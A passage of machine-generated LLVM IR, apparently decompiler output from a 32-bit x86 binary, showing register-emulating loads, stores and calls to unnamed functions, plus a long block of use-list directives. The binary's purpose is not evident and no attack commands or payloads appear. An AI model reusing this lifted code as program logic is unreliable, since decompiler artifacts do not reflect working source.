  %v3_804a3f6 = load i32, i32* %v2_804a3f6, align 4
  store i32 %v3_804a3f6, i32* @edi, align 4
  %v1_804a3fa = add i32 %v3_804a3f6, -8
  %v2_804a3fa = inttoptr i32 %v1_804a3fa to i32*
  %v3_804a3fa = load i32, i32* %v2_804a3fa, align 4
  %v5_804a3fa = add i32 %v0_804a3ef, -16
  %v6_804a3fa = inttoptr i32 %v5_804a3fa to i32*
  store i32 %v3_804a3fa, i32* %v6_804a3fa, align 4
  %v0_804a3fd = call i32 @function_804b516()
  store i32 %v0_804a3fd, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v0_804a3fd, 1
  br i1 %tmp87, label %dec_label_pc_804a502, label %dec_label_pc_804a40d

dec_label_pc_804a40d:                             ; preds = %dec_label_pc_804a1e3, %dec_label_pc_804a00b, %dec_label_pc_804a398, %dec_label_pc_804a2b9
  store i32 2, i32* @edx, align 4
  br label %dec_label_pc_804a507

dec_label_pc_804a417:                             ; preds = %dec_label_pc_8049b28
  %v2_804a417 = add i32 %v0_804a536, -4
  %v3_804a417 = inttoptr i32 %v2_804a417 to i32*
  store i32 %v4_8049b3c, i32* %v3_804a417, align 4
  %v1_804a418 = add i32 %v0_804a536, -8
  %v2_804a418 = inttoptr i32 %v1_804a418 to i32*
  store i32 1024, i32* %v2_804a418, align 4
  %v1_804a41d = add i32 %v0_804a536, -12
  %v2_804a41d = inttoptr i32 %v1_804a41d to i32*
  store i32 0, i32* %v2_804a41d, align 4
  %v1_804a41f = add i32 %v0_804a536, 100
  store i32 %v1_804a41f, i32* @ebx, align 4
  %v2_804a423 = add i32 %v0_804a536, -16
  %v3_804a423 = inttoptr i32 %v2_804a423 to i32*
  store i32 %v1_804a41f, i32* %v3_804a423, align 4
  %v4_804a424 = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a424, i32* @eax, align 4
  %v0_804a429 = load i32, i32* @esp, align 4
  %v1_804a429 = inttoptr i32 %v0_804a429 to i32*
  store i32 22, i32* %v1_804a429, align 4
  %v1_804a430 = trunc i32 %stack_var_-2308.8 to i8
  %v2_804a430 = call i32 @function_804818a(i8 %v1_804a430)
  store i32 %v2_804a430, i32* @eax, align 4
  %v0_804a435 = load i32, i32* @esp, align 4
  %v1_804a435 = inttoptr i32 %v0_804a435 to i32*
  store i32 22, i32* %v1_804a435, align 4
  %v2_804a43c = call i32 @function_804828b(i8 %v1_804a430)
  store i32 %v2_804a43c, i32* %eax.global-to-local, align 4
  %v0_804a441 = load i32, i32* @esp, align 4
  %v2_804a444 = add i32 %v0_804a441, 8
  %v3_804a444 = inttoptr i32 %v2_804a444 to i32*
  store i32 %v2_804a43c, i32* %v3_804a444, align 4
  %v1_804a445 = add i32 %v0_804a441, 4
  %v2_804a445 = inttoptr i32 %v1_804a445 to i32*
  store i32 88, i32* %v2_804a445, align 4
  %v2_804a447 = inttoptr i32 %v0_804a441 to i32*
  store i32 188, i32* %v2_804a447, align 4
  %v1_804a44c = add i32 %v0_804a441, -4
  %v2_804a44c = inttoptr i32 %v1_804a44c to i32*
  store i32 62, i32* %v2_804a44c, align 4
  %v1_804a44e = add i32 %v0_804a441, -8
  %v2_804a44e = inttoptr i32 %v1_804a44e to i32*
  store i32 185, i32* %v2_804a44e, align 4
  %v1_804a453 = add i32 %v0_804a441, -12
  %v2_804a453 = inttoptr i32 %v1_804a453 to i32*
  store i32 ptrtoint ([880 x i8]* @global_var_804dc4e.72 to i32), i32* %v2_804a453, align 4
  %v0_804a458 = load i32, i32* @ebx, align 4
  %v2_804a458 = add i32 %v0_804a441, -16
  %v3_804a458 = inttoptr i32 %v2_804a458 to i32*
  store i32 %v0_804a458, i32* %v3_804a458, align 4
  %v3_804a459 = call i32 @function_804ad34(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a459, i32* @eax, align 4
  %v0_804a45e = load i32, i32* @esp, align 4
  %v1_804a461 = add i32 %v0_804a45e, 16
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  store i32 22, i32* %v2_804a461, align 4
  %v2_804a463 = call i32 @function_804820a(i8 %v1_804a430)
  store i32 %v2_804a463, i32* %eax.global-to-local, align 4
  %v0_804a468 = load i32, i32* @ebx, align 4
  %v1_804a468 = load i32, i32* @esp, align 4
  %v2_804a468 = inttoptr i32 %v1_804a468 to i32*
  store i32 %v0_804a468, i32* %v2_804a468, align 4
  %v1_804a46b = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a46b, i32* %eax.global-to-local, align 4
  %v0_804a470 = load i32, i32* @esp, align 4
  %v1_804a470 = add i32 %v0_804a470, -4
  %v2_804a470 = inttoptr i32 %v1_804a470 to i32*
  store i32 16384, i32* %v2_804a470, align 4
  %v2_804a475 = add i32 %v0_804a470, -8
  %v3_804a475 = inttoptr i32 %v2_804a475 to i32*
  store i32 %v1_804a46b, i32* %v3_804a475, align 4
  %v0_804a476 = load i32, i32* @ebx, align 4
  %v2_804a476 = add i32 %v0_804a470, -12
  %v3_804a476 = inttoptr i32 %v2_804a476 to i32*
  store i32 %v0_804a476, i32* %v3_804a476, align 4
  %v1_804a477 = add i32 %v0_804a470, 100
  %v2_804a477 = inttoptr i32 %v1_804a477 to i32*
  %v3_804a477 = load i32, i32* %v2_804a477, align 4
  store i32 %v3_804a477, i32* %eax.global-to-local, align 4
  %v1_804a47b = add i32 %v3_804a477, -8
  %v2_804a47b = inttoptr i32 %v1_804a47b to i32*
  %v3_804a47b = load i32, i32* %v2_804a47b, align 4
  %v5_804a47b = add i32 %v0_804a470, -16
  %v6_804a47b = inttoptr i32 %v5_804a47b to i32*
  store i32 %v3_804a47b, i32* %v6_804a47b, align 4
  %v0_804a47e = call i32 @function_804b516()
  store i32 %v0_804a47e, i32* %eax.global-to-local, align 4
  %tmp88 = icmp slt i32 %v0_804a47e, 1
  br i1 %tmp88, label %dec_label_pc_804a502, label %dec_label_pc_804a48a

dec_label_pc_804a48a:                             ; preds = %dec_label_pc_804a302, %dec_label_pc_804a417
  store i32 3, i32* @edx, align 4
  br label %dec_label_pc_804a507

dec_label_pc_804a491:                             ; preds = %dec_label_pc_8049b28
  %v0_804a491 = load i32, i32* @edi, align 4
  %v2_804a491 = add i32 %v0_804a536, -4
  %v3_804a491 = inttoptr i32 %v2_804a491 to i32*
  store i32 %v0_804a491, i32* %v3_804a491, align 4
  %v1_804a492 = add i32 %v0_804a536, -8
  %v2_804a492 = inttoptr i32 %v1_804a492 to i32*
  store i32 1024, i32* %v2_804a492, align 4
  %v1_804a497 = add i32 %v0_804a536, -12
  %v2_804a497 = inttoptr i32 %v1_804a497 to i32*
  store i32 0, i32* %v2_804a497, align 4
  %v1_804a499 = add i32 %v0_804a536, 100
  store i32 %v1_804a499, i32* @esi, align 4
  %v2_804a49d = add i32 %v0_804a536, -16
  %v3_804a49d = inttoptr i32 %v2_804a49d to i32*
  store i32 %v1_804a499, i32* %v3_804a49d, align 4
  %v4_804a49e = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a49e, i32* @eax, align 4
  %v0_804a4a3 = load i32, i32* @esp, align 4
  %v1_804a4a3 = inttoptr i32 %v0_804a4a3 to i32*
  store i32 22, i32* %v1_804a4a3, align 4
  %v1_804a4aa = trunc i32 %stack_var_-2308.8 to i8
  %v2_804a4aa = call i32 @function_804818a(i8 %v1_804a4aa)
  store i32 %v2_804a4aa, i32* @eax, align 4
  %v0_804a4af = load i32, i32* @esp, align 4
  %v1_804a4af = inttoptr i32 %v0_804a4af to i32*
  store i32 22, i32* %v1_804a4af, align 4
  %v2_804a4b6 = call i32 @function_804828b(i8 %v1_804a4aa)
  store i32 %v2_804a4b6, i32* @eax, align 4
  %v0_804a4bb = load i32, i32* @esp, align 4
  %v1_804a4bb = inttoptr i32 %v0_804a4bb to i32*
  store i32 22, i32* %v1_804a4bb, align 4
  store i32 %v2_804a4b6, i32* @ebx, align 4
  %v2_804a4c4 = call i32 @function_804828b(i8 %v1_804a4aa)
  store i32 %v2_804a4c4, i32* %eax.global-to-local, align 4
  %v0_804a4c9 = load i32, i32* @ebx, align 4
  %v1_804a4c9 = load i32, i32* @esp, align 4
  %v2_804a4c9 = add i32 %v1_804a4c9, -4
  %v3_804a4c9 = inttoptr i32 %v2_804a4c9 to i32*
  store i32 %v0_804a4c9, i32* %v3_804a4c9, align 4
  %v2_804a4ca = add i32 %v1_804a4c9, -8
  %v3_804a4ca = inttoptr i32 %v2_804a4ca to i32*
  store i32 %v2_804a4c4, i32* %v3_804a4ca, align 4
  %v1_804a4cb = add i32 %v1_804a4c9, -12
  %v2_804a4cb = inttoptr i32 %v1_804a4cb to i32*
  store i32 ptrtoint ([852 x i8]* @global_var_804dfbe.73 to i32), i32* %v2_804a4cb, align 4
  %v0_804a4d0 = load i32, i32* @esi, align 4
  %v2_804a4d0 = add i32 %v1_804a4c9, -16
  %v3_804a4d0 = inttoptr i32 %v2_804a4d0 to i32*
  store i32 %v0_804a4d0, i32* %v3_804a4d0, align 4
  %v3_804a4d1 = call i32 @function_804ad34(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a4d1, i32* @eax, align 4
  %v0_804a4d6 = load i32, i32* @esp, align 4
  %v1_804a4d9 = add i32 %v0_804a4d6, 16
  %v2_804a4d9 = inttoptr i32 %v1_804a4d9 to i32*
  store i32 22, i32* %v2_804a4d9, align 4
  %v2_804a4db = call i32 @function_804820a(i8 %v1_804a4aa)
  store i32 %v2_804a4db, i32* %eax.global-to-local, align 4
  %v0_804a4e0 = load i32, i32* @esi, align 4
  %v1_804a4e0 = load i32, i32* @esp, align 4
  %v2_804a4e0 = inttoptr i32 %v1_804a4e0 to i32*
  store i32 %v0_804a4e0, i32* %v2_804a4e0, align 4
  %v1_804a4e3 = call i32 @function_804a688(i32 %stack_var_-2308.8)
  store i32 %v1_804a4e3, i32* %eax.global-to-local, align 4
  %v0_804a4e8 = load i32, i32* @esp, align 4
  %v1_804a4e8 = add i32 %v0_804a4e8, -4
  %v2_804a4e8 = inttoptr i32 %v1_804a4e8 to i32*
  store i32 16384, i32* %v2_804a4e8, align 4
  %v2_804a4ed = add i32 %v0_804a4e8, -8
  %v3_804a4ed = inttoptr i32 %v2_804a4ed to i32*
  store i32 %v1_804a4e3, i32* %v3_804a4ed, align 4
  %v0_804a4ee = load i32, i32* @esi, align 4
  %v2_804a4ee = add i32 %v0_804a4e8, -12
  %v3_804a4ee = inttoptr i32 %v2_804a4ee to i32*
  store i32 %v0_804a4ee, i32* %v3_804a4ee, align 4
  %v1_804a4ef = add i32 %v0_804a4e8, 100
  %v2_804a4ef = inttoptr i32 %v1_804a4ef to i32*
  %v3_804a4ef = load i32, i32* %v2_804a4ef, align 4
  store i32 %v3_804a4ef, i32* %edx.global-to-local, align 4
  %v1_804a4f3 = add i32 %v3_804a4ef, -8
  %v2_804a4f3 = inttoptr i32 %v1_804a4f3 to i32*
  %v3_804a4f3 = load i32, i32* %v2_804a4f3, align 4
  %v5_804a4f3 = add i32 %v0_804a4e8, -16
  %v6_804a4f3 = inttoptr i32 %v5_804a4f3 to i32*
  store i32 %v3_804a4f3, i32* %v6_804a4f3, align 4
  br label %dec_label_pc_804a4f6

dec_label_pc_804a4f6:                             ; preds = %dec_label_pc_804a1f6, %dec_label_pc_804a491
  %v0_804a4f6 = call i32 @function_804b516()
  store i32 %v0_804a4f6, i32* %eax.global-to-local, align 4
  %tmp89 = icmp slt i32 %v0_804a4f6, 1
  %tmp90 = icmp eq i1 %tmp89, false
  br i1 %tmp90, label %dec_label_pc_804a510, label %dec_label_pc_804a502

dec_label_pc_804a502:                             ; preds = %dec_label_pc_804a28c, %dec_label_pc_8049ea0, %dec_label_pc_804a417, %dec_label_pc_804a398, %dec_label_pc_804a32a, %dec_label_pc_804a302, %dec_label_pc_804a2d7, %dec_label_pc_804a260, %dec_label_pc_804a4f6, %dec_label_pc_804a143, %dec_label_pc_804a00b, %dec_label_pc_8049e23, %dec_label_pc_8049d9f, %dec_label_pc_8049d1d, %dec_label_pc_804a357
  %stack_var_-2308.4 = phi i32 [ %stack_var_-2308.8, %dec_label_pc_804a143 ], [ %stack_var_-2308.8, %dec_label_pc_804a32a ], [ %stack_var_-2308.8, %dec_label_pc_804a357 ], [ %stack_var_-2308.8, %dec_label_pc_804a4f6 ], [ %stack_var_-2308.8, %dec_label_pc_804a2d7 ], [ %stack_var_-2308.8, %dec_label_pc_804a302 ], [ %stack_var_-2308.8, %dec_label_pc_804a00b ], [ %stack_var_-2308.8, %dec_label_pc_804a417 ], [ %stack_var_-2308.8, %dec_label_pc_804a398 ], [ %stack_var_-2308.8, %dec_label_pc_804a260 ], [ %stack_var_-2308.8, %dec_label_pc_804a28c ], [ %stack_var_-2308.8, %dec_label_pc_8049e23 ], [ %stack_var_-2308.8, %dec_label_pc_8049d9f ], [ %stack_var_-2308.8, %dec_label_pc_8049d1d ], [ %stack_var_-2308.3, %dec_label_pc_8049ea0 ]
  store i32 1, i32* @edx, align 4
  br label %dec_label_pc_804a507

dec_label_pc_804a507:                             ; preds = %dec_label_pc_804a48a, %dec_label_pc_804a40d, %dec_label_pc_804a502
  %stack_var_-2308.5 = phi i32 [ %stack_var_-2308.4, %dec_label_pc_804a502 ], [ %stack_var_-2308.8, %dec_label_pc_804a40d ], [ %stack_var_-2308.8, %dec_label_pc_804a48a ]
  %v0_804a507 = load i32, i32* @ebp, align 4
  store i32 %v0_804a507, i32* @eax, align 4
  %v0_804a509 = call i32 @function_8049717()
  store i32 %v0_804a509, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a510:                             ; preds = %dec_label_pc_804a4f6, %dec_label_pc_804a1c7
  store i32 15, i32* @edx, align 4
  br label %dec_label_pc_804a515

dec_label_pc_804a515:                             ; preds = %dec_label_pc_804a38b, %dec_label_pc_804a377, %dec_label_pc_804a28c, %dec_label_pc_804a253, %dec_label_pc_804a23f, %dec_label_pc_8049e54, %dec_label_pc_8049e44, %dec_label_pc_8049e34, %dec_label_pc_8049ea0, %dec_label_pc_8049e93, %dec_label_pc_8049e7f, %dec_label_pc_8049e6b, %dec_label_pc_8049d2b, %dec_label_pc_804a510
  %stack_var_-2308.6 = phi i32 [ %stack_var_-2308.3, %dec_label_pc_8049e7f ], [ %stack_var_-2308.8, %dec_label_pc_804a510 ], [ %stack_var_-2308.8, %dec_label_pc_804a377 ], [ %stack_var_-2308.8, %dec_label_pc_804a38b ], [ %stack_var_-2308.8, %dec_label_pc_804a23f ], [ %stack_var_-2308.8, %dec_label_pc_804a253 ], [ %stack_var_-2308.8, %dec_label_pc_804a28c ], [ %stack_var_-2308.8, %dec_label_pc_8049e34 ], [ %stack_var_-2308.8, %dec_label_pc_8049e44 ], [ %stack_var_-2308.8, %dec_label_pc_8049e54 ], [ %stack_var_-2308.8, %dec_label_pc_8049e6b ], [ %stack_var_-2308.8, %dec_label_pc_8049d2b ], [ %stack_var_-2308.3, %dec_label_pc_8049e93 ], [ %stack_var_-2308.3, %dec_label_pc_8049ea0 ]
  %v0_804a515 = load i32, i32* @ebp, align 4
  store i32 %v0_804a515, i32* @eax, align 4
  %v0_804a517 = call i32 @function_80496f9()
  store i32 %v0_804a517, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a51e:                             ; preds = %dec_label_pc_8049b28
  store i32 15, i32* @edx, align 4
  br label %dec_label_pc_804a523

dec_label_pc_804a523:                             ; preds = %dec_label_pc_804a2cd, %dec_label_pc_8049e2a, %dec_label_pc_804a51e
  %v0_804a523 = load i32, i32* @ebp, align 4
  store i32 %v0_804a523, i32* @eax, align 4
  %v0_804a525 = call i32 @function_804975b()
  store i32 %v0_804a525, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a52a

dec_label_pc_804a52a:                             ; preds = %dec_label_pc_8049b28, %dec_label_pc_804a1e3, %dec_label_pc_8049ca7, %dec_label_pc_804a133, %dec_label_pc_8049de9, %dec_label_pc_804a515, %dec_label_pc_804a507, %dec_label_pc_804a523
  %stack_var_-2308.7 = phi i32 [ %stack_var_-2308.6, %dec_label_pc_804a515 ], [ %stack_var_-2308.8, %dec_label_pc_8049b28 ], [ %stack_var_-2308.8, %dec_label_pc_804a523 ], [ %stack_var_-2308.5, %dec_label_pc_804a507 ], [ %stack_var_-2308.8, %dec_label_pc_804a1e3 ], [ %stack_var_-2308.8, %dec_label_pc_804a133 ], [ %stack_var_-2308.8, %dec_label_pc_8049de9 ], [ %stack_var_-2308.8, %dec_label_pc_8049ca7 ]
  %v0_804a52a = load i32, i32* @esp, align 4
  %v1_804a52a = add i32 %v0_804a52a, 92
  %v2_804a52a = inttoptr i32 %v1_804a52a to i32*
  %v3_804a52a = load i32, i32* %v2_804a52a, align 4
  %v4_804a52a = add i32 %v3_804a52a, 1
  store i32 %v4_804a52a, i32* %v2_804a52a, align 4
  %v0_804a52e = load i32, i32* @esp, align 4
  %v1_804a52e = add i32 %v0_804a52e, 84
  %v2_804a52e = inttoptr i32 %v1_804a52e to i32*
  %v3_804a52e = load i32, i32* %v2_804a52e, align 4
  %v4_804a52e = add i32 %v3_804a52e, 1048
  store i32 %v4_804a52e, i32* %v2_804a52e, align 4
  br label %dec_label_pc_804a536

dec_label_pc_804a536:                             ; preds = %dec_label_pc_8049b10, %dec_label_pc_804a52a
  %stack_var_-2308.8 = phi i32 [ %stack_var_-2308.7, %dec_label_pc_804a52a ], [ %stack_var_-2308.1, %dec_label_pc_8049b10 ]
  %v0_804a536 = load i32, i32* @esp, align 4
  %v1_804a536 = add i32 %v0_804a536, 28
  %v2_804a536 = inttoptr i32 %v1_804a536 to i32*
  %v3_804a536 = load i32, i32* %v2_804a536, align 4
  %v1_804a53a = add i32 %v0_804a536, 92
  %v2_804a53a = inttoptr i32 %v1_804a53a to i32*
  %v3_804a53a = load i32, i32* %v2_804a53a, align 4
  %v5_804a53a = sub i32 %v3_804a53a, %v3_804a536
  %v11_804a53a = xor i32 %v3_804a53a, %v3_804a536
  %v12_804a53a = xor i32 %v5_804a53a, %v3_804a53a
  %v13_804a53a = and i32 %v12_804a53a, %v11_804a53a
  %v14_804a53a = icmp slt i32 %v13_804a53a, 0
  %v16_804a53a = icmp slt i32 %v5_804a53a, 0
  %v2_804a53e = icmp eq i1 %v16_804a53a, %v14_804a53a
  br i1 %v2_804a53e, label %dec_label_pc_8049b10, label %dec_label_pc_8049b28

dec_label_pc_804a549:                             ; preds = %dec_label_pc_80497b0, %dec_label_pc_8049789
  %v0_804a553 = phi i32 [ 0, %dec_label_pc_80497b0 ], [ %v2_804979e, %dec_label_pc_8049789 ]
  store i32 %v0_804978c, i32* %ebx.global-to-local, align 4
  store i32 %v0_804978a, i32* %edi.global-to-local, align 4
  ret i32 %v0_804a553

; uselistorder directives
  uselistorder i32 %v5_804a53a, { 1, 0 }
  uselistorder i32 %v0_804a536, { 47, 48, 0, 45, 2, 3, 4, 5, 1, 6, 8, 7, 46, 33, 34, 35, 36, 37, 40, 41, 42, 43, 44, 9, 10, 11, 12, 13, 14, 15, 26, 27, 38, 39, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 30, 31, 32 }
  uselistorder i32 %stack_var_-2308.8, { 0, 5, 4, 3, 2, 1, 13, 11, 10, 9, 7, 19, 16, 15, 21, 34, 55, 54, 53, 52, 51, 50, 49, 48, 69, 68, 67, 66, 80, 79, 78, 77, 27, 26, 25, 31, 59, 72, 39, 38, 37, 36, 46, 45, 44, 43, 64, 63, 62, 61, 76, 71, 70, 60, 58, 57, 47, 42, 35, 30, 28, 18, 17, 6, 73, 56, 75, 41, 40, 33, 32, 29, 24, 23, 22, 20, 8, 82, 81, 74, 65, 14, 12 }
  uselistorder i32 %v1_804a285, { 2, 1, 0 }
  uselistorder i32 %v0_804a27d, { 1, 2, 0 }
  uselistorder i32 %v3_804a0d6, { 1, 2, 0 }
  uselistorder i32 %v0_804a0b2, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804a020, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a002, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8049ffd, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8049ff5, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049fd4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8049f8f104, { 1, 0 }
  uselistorder i32* %v2_8049f8f103, { 1, 0 }
  uselistorder i32 %v5_8049f8994, { 1, 0 }
  uselistorder i32* %v3_8049f8992, { 1, 0 }
  uselistorder i32 %v0_8049fa4, { 1, 0 }
  uselistorder i32 %v1_8049f8932, { 1, 2, 0 }
  uselistorder i32 %v0_8049f93, { 1, 0, 2 }
  uselistorder i32 %v5_8049f89, { 1, 0 }
  uselistorder i32* %v3_8049f89, { 1, 0 }
  uselistorder i32 %v1_8049f88, { 1, 0 }
  uselistorder i32 %v1_8049f87, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v1_8049f8931, { 1, 0, 2 }
  uselistorder i32 %v0_8049f67105, { 1, 0 }
  uselistorder i32 %v17_8049f8f106, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v3_8049f8f109, { 1, 0 }
  uselistorder i8* %v3_8049f51, { 1, 0, 2 }
  uselistorder i32 %v0_8049f45, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8049ed4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %stack_var_-2308.3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8049ea0, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8049dfa, { 3, 0, 1, 2 }
  uselistorder i32 %v3_8049df5, { 1, 0 }
  uselistorder i32 %v5_8049d8e, { 1, 0, 2 }
  uselistorder i32 %v2_8049d54, { 1, 0 }
  uselistorder i32 %v1_8049d51, { 1, 0 }
  uselistorder i32 %v1_8049d35, { 1, 0, 2 }
  uselistorder i32 %v12_8049cf4, { 1, 0 }
  uselistorder i32 %v0_8049cf1, { 2, 0, 1 }
  uselistorder i32 %v3_8049cd2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8049ca7, { 1, 0 }
  uselistorder i32 %v1_8049ba7, { 2, 1, 0 }
  uselistorder i32 %v0_8049ba2, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v4_8049b3c, { 1, 0, 2 }
  uselistorder i8 %v2_8049b3c, { 1, 0 }
  uselistorder i32 %v3_8049b28, { 3, 2, 1, 4, 0 }
  uselistorder i32* %v2_8049b28, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8049b10, { 1, 0 }
  uselistorder i32 %v0_8049b0a, { 1, 0 }
  uselistorder i32 %v1_8049afe, { 0, 2, 1 }
  uselistorder i32 %stack_var_-2308.021, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80499d9, { 1, 0 }
  uselistorder i32 %v2_80499cc, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_804999e, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_8049932, { 1, 2, 4, 3, 6, 5, 7, 0, 9, 8, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i32 %v2_8049875, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8049867, { 1, 0, 2 }
  uselistorder i32 %v4_8049821, { 2, 1, 0 }
  uselistorder i32 %stack_var_-2368.0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8049804, { 1, 2, 0 }
  uselistorder i32 %v1_80497fe, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804979e, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v15_804978d, { 2, 3, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 32, 33, 34, 35, 36, 28, 29, 30, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 3, 0, 1, 2, 7, 8, 4, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 113, 114, 28, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 67, 72, 73, 62, 63, 64, 66, 65, 71, 68, 69, 70, 74, 75, 76, 77, 89, 90, 91, 92, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 116, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 93, 94, 95, 130, 96, 133, 97, 98, 99, 132, 100, 101, 102, 103, 0, 131, 104, 105, 106, 107, 108, 110, 109, 112, 111 }
  uselistorder i32 ()* @function_8049639, { 1, 0 }
  uselistorder i32 ()* @function_804b516, { 4, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 2364, { 1, 0 }
  uselistorder i32 2360, { 1, 0, 2 }
  uselistorder i32 2396, { 1, 0 }
  uselistorder i64 255, { 1, 0 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 4, 3, 2, 1, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_80495b0, { 2, 1, 0 }
  uselistorder i16 0, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_804ad34, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8, i32)* @function_804a6fc, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14 }
  uselistorder i32 (i32)* @function_804a688, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_80491c6, { 1, 0 }
  uselistorder i32 2054, { 1, 0 }
  uselistorder i32 1048, { 4, 5, 3, 1, 0, 2 }
  uselistorder i8 %arg1, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_804a536, { 1, 0 }
  uselistorder label %dec_label_pc_804a52a, { 7, 5, 6, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_804a523, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a515, { 13, 0, 1, 2, 3, 4, 8, 9, 10, 11, 5, 6, 7, 12 }
  uselistorder label %dec_label_pc_804a507, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a502, { 8, 2, 3, 14, 4, 5, 6, 0, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder label %dec_label_pc_804a4f6, { 1, 0 }
  uselistorder label %dec_label_pc_804a48a, { 1, 0 }
  uselistorder label %dec_label_pc_804a40d, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804a133, { 1, 0 }
  uselistorder label %dec_label_pc_804a0e1, { 1, 0 }
  uselistorder label %dec_label_pc_804a0c9, { 1, 0 }
  uselistorder label %dec_label_pc_8049ff5, { 1, 0 }
  uselistorder label %dec_label_pc_8049f8f, { 1, 0 }
  uselistorder label %dec_label_pc_8049f87, { 1, 0 }
  uselistorder label %dec_label_pc_8049e7f, { 1, 0 }
  uselistorder label %dec_label_pc_8049ca7, { 1, 0 }
  uselistorder label %dec_label_pc_8049c75, { 4, 2, 5, 1, 3, 6, 7, 0 }
  uselistorder label %dec_label_pc_8049bfa, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b6d, { 4, 5, 2, 6, 7, 8, 3, 1, 9, 0, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_8049b10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049ae4, { 1, 0 }
  uselistorder label %dec_label_pc_8049ae0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049ad3, { 1, 0 }
  uselistorder label %dec_label_pc_80499c7, { 1, 0 }
  uselistorder label %dec_label_pc_8049816, { 1, 0 }
}

define i32 @function_804a554() local_unnamed_addr {
dec_label_pc_804a554:
  %v0_804a559 = load i32, i32* @global_var_804f6ac.74, align 4
  %v2_804a55f = call i32 @function_804af6b(i32 %v0_804a559, i32 9)
  ret i32 %v2_804a55f
}

define i32 @function_804a568(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804a568:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804a56b = load i32, i32* @ebx, align 4
  %v15_804a56c = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_804a580 = call i32 @function_804aea2(i32 %v0_804a56b)
  %v10_804a585 = icmp eq i32 %v1_804a580, -1
  store i32 %v1_804a580, i32* @global_var_804f6ac.74, align 4
  br i1 %v10_804a585, label %dec_label_pc_804a67d, label %dec_label_pc_804a593

dec_label_pc_804a593:                             ; preds = %dec_label_pc_804a568
  %tmp28 = icmp slt i32 %v1_804a580, 1
